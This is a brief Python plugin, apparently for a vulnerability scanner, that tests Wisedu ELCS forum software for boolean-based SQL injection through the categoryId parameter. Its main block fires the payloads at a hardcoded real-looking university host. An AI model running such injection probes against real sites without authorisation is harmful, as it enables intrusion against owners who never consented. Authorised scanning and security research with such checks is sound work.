#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = wisedu_elcs_sqli
#_FileName_ = wisedu_elcs_sqli.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-071006

import time

def assign(service, arg):
    if service == 'wisedu_elcs':
        return True, arg

def audit(arg):
    payload1 = "elcs/forum/forumIndexAction!init.action?categoryId=1%20AND%208890=8891"
    payload2 = "elcs/forum/forumIndexAction!init.action?categoryId=1%20AND%208890=8890"
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
    if code2==200 and code1==200 and res2!=res1:
        security_hole(arg+payload1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wisedu_elcs', 'http://rntp.gzkmu.cn/')[1])